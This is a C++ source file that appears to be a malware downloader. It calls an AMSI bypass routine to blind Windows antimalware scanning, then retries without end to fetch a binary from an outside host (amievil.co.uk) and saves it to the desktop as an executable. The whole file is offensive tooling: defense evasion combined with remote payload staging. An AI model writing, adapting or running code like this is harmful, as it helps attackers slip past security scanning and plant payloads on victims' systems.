#include <Windows.h>
#include <Urlmon.h>   // URLOpenBlockingStreamW()
#include <atlbase.h>  // CComPtr
#include <iostream>
#include "download.h"
#include <fstream>
#include <assert.h>
#include <chrono>
#include <thread>
#include "patchless_amsi.h"
#pragma comment( lib, "Urlmon.lib" )

struct ComInit
{
    HRESULT hr;
    ComInit() : hr(::CoInitialize(nullptr)) {}
    ~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};

int download_file()
{
    ComInit init;
    HRESULT hr;

    // use CComPtr so you don't have to manually call Release()
    CComPtr<IStream> pStream;
    bool success = false;

    do
    {
        try {
            setupAMSIBypass();
            // Open the HTTP request.
            hr = URLOpenBlockingStreamW(nullptr, L"https://www.amievil.co.uk/updates/download/979a1be6-a0c6-4dac-80ae-428bada4eca6", &pStream, 0, nullptr);
            if (SUCCEEDED(hr)) break;
            std::cout << "ERROR: Could not connect. HRESULT: 0x" << std::hex << hr << std::dec << "\n";
        }
        catch (const std::exception& ex) {
            std::cout << ex.what();
        }
    } while (true);

    std::ofstream file("C:\\Users\\dev-admin\\desktop\\ArtemisClientDownloaded.exe", std::ios_base::binary);
    if (!file.is_open()) {
        std::cout << "ERROR: Download failed. Unable to create output file.\n";
        return 1;
    }


    // Download the response and write it to stdout.
    char buffer[4096];
    do
    {
        DWORD bytesRead = 0;
        hr = pStream->Read(buffer, sizeof(buffer), &bytesRead);
        
        if (bytesRead > 0)
            file.write(buffer, bytesRead);

    } while (SUCCEEDED(hr) && hr != S_FALSE);

    file.close();

    if (FAILED(hr))
    {
        std::cout << "ERROR: Download failed. HRESULT: 0x" << std::hex << hr << std::dec << "\n";
        return 2;
    }

    std::cout << "\n";

    return 0;
}
